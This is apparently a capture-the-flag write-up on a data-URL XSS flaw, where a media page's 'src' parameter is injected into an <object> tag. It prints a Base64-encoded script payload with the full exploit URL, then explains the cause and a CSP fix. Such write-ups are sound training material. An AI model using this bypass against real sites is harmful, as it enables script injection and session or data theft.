# Data URL XSS

## Description

This challenge revolves around an XSS vulnerability enabled through **data URLs** being injected into an `<object>` tag on the media page.

## How to Get the Flag

* Access the media page via one of the images on the home page:

  ```
  http://localhost/index.php?page=media&src=
  ```
* By inspecting the HTML source, you can see that whatever value is placed after `src=` is directly inserted into the `data` attribute of an `<object>` tag.
* Since `<object>` can load not only images but also full HTML documents, an attacker can embed arbitrary HTML.
* Then we use a **data URL** to inject our own file. A data URL lets you embed an entire file’s content directly in the URL.
* To bypass any basic filtering, encode the HTML payload in Base64.

#### Payload

HTML to encode:

```html
<script>alert("malcious code")</script>
```

Encoded to Base64:

```
PHNjcmlwdD5hbGVydCgibWFsY2lvdXMgY29kZSIpPC9zY3JpcHQ+
```

Final working URL:

```
http://localhost/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgibWFsY2lvdXMgY29kZSIpPC9zY3JpcHQ+
```

This triggers the JavaScript execution and reveals the flag.

## Vulnerability Explanation

* The page inserts untrusted user‑controlled data directly into an `<object>` tag.
* Because data URLs are allowed, arbitrary HTML and JavaScript can be executed.
* No sanitization or filtering prevents script execution.
* Risks are very high: full XSS and arbitrary JavaScript execution.

## Prevention of Vulnerability

* Always sanitize user input before using it in HTML attributes.
* Apply a restrictive **Content Security Policy (CSP)** to block `data:` sources.
* Never trust query parameters without validation.

### Example CSP Implementation
```
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  next();
});
```